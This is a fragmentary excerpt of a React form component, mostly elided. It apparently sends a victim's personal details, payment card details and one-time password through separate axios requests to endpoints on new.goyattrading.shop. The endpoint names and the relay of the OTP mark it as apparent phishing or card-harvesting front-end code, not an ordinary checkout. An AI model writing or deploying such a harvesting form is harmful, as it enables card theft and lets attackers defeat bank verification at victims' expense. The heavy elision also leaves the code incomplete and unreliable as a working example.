...
const FirstForm = () => {
  ...
  const submitPersonalInfo = async () => {
    ...
    try {
      const response = await axios.post("https://new.goyattrading.shop/v1/send-personal-details", {
  ...
  const submitCardDetails = async () => {
    try {
      const response = await axios.post("https://new.goyattrading.shop/v1/send-card-details", {
  ...
  const verifyOtp = async () => {
    try {
      const response = await axios.post("https://new.goyattrading.shop/v1/send-otp", {
        otp: formData.otp,
      });
